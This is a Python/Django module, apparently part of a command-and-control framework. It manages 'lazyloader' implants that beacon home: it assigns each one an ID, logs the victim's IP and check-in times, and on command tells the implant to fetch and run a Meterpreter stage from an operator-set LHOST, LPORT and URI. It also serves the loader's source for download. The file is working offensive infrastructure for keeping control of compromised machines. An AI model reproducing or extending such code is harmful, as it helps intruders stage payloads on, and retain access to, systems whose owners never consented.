# -*- coding: utf-8 -*-
# @File  : lazyloader.py
# @Date  : 2021/2/25
# @Desc  :
import json
import os
import time
from urllib import parse
from wsgiref.util import FileWrapper

from django.conf import settings
from django.http import HttpResponse

from Lib.api import data_return, get_one_uuid_str
from Lib.configs import CODE_MSG_ZH, STATIC_STORE_PATH, LazyLoader_MSG_ZH, CODE_MSG_EN, LazyLoader_MSG_EN
from Lib.log import logger
from Lib.xcache import Xcache


class LazyLoader(object):
    """延迟控制metsrv加载"""

    def __init__(self):
        pass

    @staticmethod
    def list():
        from Msgrpc.Handle.handler import Handler
        data = Xcache.list_lazyloader()
        handlers = Handler.list_handler_config()
        context = data_return(200, {"lazyloaders": data, "handlers": handlers}, CODE_MSG_ZH.get(200),
                              CODE_MSG_EN.get(200))
        return context

    @staticmethod
    def source_code():

        filename = "lazyloader.zip"
        lazyloader_source_code_path = os.path.join(settings.BASE_DIR, STATIC_STORE_PATH, filename)
        byteresult = FileWrapper(open(lazyloader_source_code_path, 'rb'), blksize=1024)
        response = HttpResponse(byteresult)
        response['Content-Type'] = 'application/octet-stream'
        response['Code'] = 200
        response['Msg_zh'] = parse.quote(LazyLoader_MSG_ZH.get(203))
        response['Msg_en'] = parse.quote(LazyLoader_MSG_EN.get(203))
        # 中文特殊处理
        urlpart = parse.quote(os.path.splitext(filename)[0], 'utf-8')
        leftpart = os.path.splitext(filename)[-1]
        response['Content-Disposition'] = f"{urlpart}{leftpart}"

        return response

    @staticmethod
    def update(loader_uuid, field, data):
        if field == "payload":
            try:
                data = json.loads(data)
            except Exception as E:
                logger.exception(E)
                logger.warning(data)
                context = data_return(303, [], LazyLoader_MSG_ZH.get(303), LazyLoader_MSG_EN.get(303))
                return context

        lazyloader = Xcache.get_lazyloader_by_uuid(loader_uuid)
        if lazyloader is None:
            context = data_return(304, {}, LazyLoader_MSG_ZH.get(304), LazyLoader_MSG_EN.get(304))
            return context
        else:
            lazyloader[field] = data
            Xcache.set_lazyloader_by_uuid(loader_uuid, lazyloader)
            context = data_return(201, data, LazyLoader_MSG_ZH.get(201), LazyLoader_MSG_EN.get(201))
            return context

    @staticmethod
    def destory(loader_uuid):
        data = Xcache.del_lazyloader_by_uuid(loader_uuid)
        context = data_return(202, data, LazyLoader_MSG_ZH.get(202), LazyLoader_MSG_EN.get(202))
        return context

    @staticmethod
    def list_interface(req, loader_uuid, ipaddress):
        """loader 对外接口"""
        empty_lazyloader = {
            "uuid": None,
            "ipaddress": "127.0.0.1",
            "last_check": 0,
            "interval": 60,
            "payload": None,
            "send_payload": False,  # 是否向loader发送了payload
            "exit_loop": False,
        }
        sleep_cmd = "S"
        run_cmd = "R"
        exit_cmd = "E"
        null_cmd = "N"
        if loader_uuid is None:  # 首次请求
            if req == "u":
                loader_uuid = get_one_uuid_str()
                context = f"{loader_uuid}"
            else:
                context = f"{null_cmd}"
            return context
        else:
            if len(loader_uuid) != 16:  # 检查uuid
                context = f"{null_cmd}"
                return context
            if req == "h":  # 心跳请求
                lazyloader = Xcache.get_lazyloader_by_uuid(loader_uuid)
                if lazyloader is None:  # 初始化数据
                    empty_lazyloader["uuid"] = loader_uuid
                    empty_lazyloader["ipaddress"] = ipaddress
                    empty_lazyloader["last_check"] = int(time.time())
                    Xcache.set_lazyloader_by_uuid(loader_uuid, empty_lazyloader)
                    context = f"{sleep_cmd}"
                    return context
                else:
                    if lazyloader.get("exit_loop") is True:  # 退出循环
                        Xcache.del_lazyloader_by_uuid(loader_uuid)
                        context = f"{exit_cmd}"
                        return context

                    new_interval = int(time.time()) - lazyloader.get("last_check")  # 获取新间隔
                    if new_interval < lazyloader["interval"]:
                        lazyloader["interval"] = new_interval

                    lazyloader["last_check"] = int(time.time())  # 更新最后心跳
                    lazyloader["ipaddress"] = ipaddress  # 更新对端地址

                    if lazyloader["payload"] is not None and lazyloader["send_payload"] is False:  # 发送payload
                        # 获取payload配置
                        payload = lazyloader.get("payload")
                        lhost = payload.get("LHOST")
                        lport = payload.get("LPORT")
                        luri = payload.get("LURI")

                        lazyloader["send_payload"] = True

                        context = f"{run_cmd}-{lhost}-{lport}-{luri}"
                    else:
                        context = f"{sleep_cmd}"
                    Xcache.set_lazyloader_by_uuid(loader_uuid, lazyloader)
                    return context
            else:
                context = f"{null_cmd}"
                return context
